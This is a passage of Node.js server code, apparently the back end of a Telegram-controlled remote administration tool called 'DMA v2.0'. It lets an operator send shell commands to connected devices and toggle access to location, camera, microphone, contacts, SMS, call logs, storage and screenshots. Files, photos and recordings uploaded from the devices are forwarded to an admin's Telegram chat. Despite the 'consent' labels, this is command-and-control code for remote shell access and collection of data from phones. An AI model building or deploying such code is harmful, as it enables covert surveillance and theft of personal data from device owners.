            case 'shell':
                setUserSession(chatId, { state: 'awaiting_shell_command', deviceId });
                bot.sendMessage(chatId, `🖥️ Enter shell command:`, removeKeyboard).catch(e => {});
                break;
            case 'privacy':
                sendCommandToDevice(deviceId, 'get_consents');
                bot.sendMessage(chatId, `🔐 Fetching consents...`).catch(e => {});
                break;
            case 'revoke':
                bot.sendMessage(chatId, 
                    `🚫 Select consent to revoke:`,
                    {
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: '📍 Location', callback_data: `revoke_LOCATION_${deviceId}` },
                                    { text: '📷 Camera', callback_data: `revoke_CAMERA_${deviceId}` }
                                ],
                                [
                                    { text: '🎤 Mic', callback_data: `revoke_MICROPHONE_${deviceId}` },
                                    { text: '📒 Contacts', callback_data: `revoke_CONTACTS_${deviceId}` }
                                ],
                                [
                                    { text: '💬 SMS', callback_data: `revoke_SMS_${deviceId}` },
                                    { text: '📞 Calls', callback_data: `revoke_CALL_LOG_${deviceId}` }
                                ],
                                [
                                    { text: '📁 Storage', callback_data: `revoke_STORAGE_${deviceId}` },
                                    { text: '📸 Screenshot', callback_data: `revoke_SCREENSHOT_${deviceId}` }
                                ]
                            ]
                        }
                    }
                ).catch(e => {});
                break;
            case 'revoke_LOCATION':
            case 'revoke_CAMERA':
            case 'revoke_MICROPHONE':
            case 'revoke_CONTACTS':
            case 'revoke_SMS':
            case 'revoke_CALL_LOG':
            case 'revoke_STORAGE':
            case 'revoke_SCREENSHOT':
                const consentType = action.split('_')[1];
                sendCommandToDevice(deviceId, 'revoke_consent', { 
                    type: consentType, 
                    reason: 'Revoked via inline button' 
                });
                bot.sendMessage(chatId, `🚫 Revoked ${consentType}`).catch(e => {});
                break;
            case 'revoke_all':
                sendCommandToDevice(deviceId, 'revoke_all_consents', { reason: 'Revoked all via inline button' });
                bot.sendMessage(chatId, `⚠️ Revoking ALL consents...`).catch(e => {});
                break;
        }
    });
}

// ============================================
// API ENDPOINTS
// ============================================

// File upload endpoint
app.post('/api/upload', upload.single('file'), (req, res) => {
    try {
        const deviceId = req.headers['device-id'];
        
        if (!deviceId || !req.file) {
            return res.status(400).json({ error: 'Missing data' });
        }
        
        const fileSize = (req.file.size / 1024 / 1024).toFixed(2);
        
        if (bot) {
            bot.sendDocument(adminId, req.file.path, {
                caption: `📁 *File Received*\nDevice: \`${deviceId.substring(0, 8)}...\`\nType: ${req.headers['file-type'] || 'file'}\nSize: ${fileSize}MB`,
                parse_mode: 'Markdown'
            }).then(() => {
                setTimeout(() => {
                    if (fs.existsSync(req.file.path)) fs.unlinkSync(req.file.path);
                }, 60000);
            }).catch(e => {});
        }
        
        res.json({ success: true });
        
    } catch (error) {
        res.status(500).json({ error: 'Upload failed' });
    }
});

// Health check
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        devices: connectedDevices.size,
        uptime: process.uptime(),
        version: '2.0.0'
    });
});

// ============================================
// CLEANUP JOBS
// ============================================

// Clean old sessions
setInterval(() => {
    const now = Date.now();
    userSessions.forEach((s, id) => {
        if (now - s.timestamp > 10 * 60 * 1000) userSessions.delete(id);
    });
}, 5 * 60 * 1000);

// Clean old files
setInterval(() => {
    const now = Date.now();
    const maxAge = 12 * 60 * 60 * 1000;
    
    ['uploads', 'screenshots', 'recordings', 'photos', 'temp'].forEach(dir => {
        if (fs.existsSync(dir)) {
            fs.readdirSync(dir).forEach(file => {
                const filePath = path.join(dir, file);
                try {
                    if (now - fs.statSync(filePath).mtimeMs > maxAge) {
                        fs.unlinkSync(filePath);
                    }
                } catch (e) {}
            });
        }
    });
}, 60 * 60 * 1000);

// ============================================
// START SERVER
// ============================================
server.listen(PORT, '0.0.0.0', async () => {
    console.log('\n\x1b[36m%s\x1b[0m', '🚀 DMA v2.0');
    console.log('\x1b[36m%s\x1b[0m', '━━━━━━━━━━━━━━━━━━━━━');
    console.log(`📡 Port: ${PORT}`);
    console.log(`🔧 Trust proxy: Enabled`);
    
    let retries = 0;
    while (retries < 3) {
        try {
            bot = await startBot();
            if (bot) break;
        } catch (e) {
            retries++;
            console.log(`⚠️ Retry ${retries}/3...`);
            await new Promise(r => setTimeout(r, 3000));
        }
    }
    
    console.log(`🤖 Bot: ${bot ? '✅' : '❌'}`);
    console.log(`📱 Commands: 20 registered`);
    console.log(`⌨️ Device Menu: 18 actions in 1 keyboard`);
    console.log('\x1b[36m%s\x1b[0m', '━━━━━━━━━━━━━━━━━━━━━\n');
});

// ============================================
// GRACEFUL SHUTDOWN
// ============================================
process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);

function shutdown() {
    console.log('\n🛑 Shutting down...');
    if (bot) bot.stopPolling();
    wss.close();
    server.close(() => process.exit(0));
}

// ============================================
// EXPORTS
// ============================================
module.exports = { app, server, wss, connectedDevices };
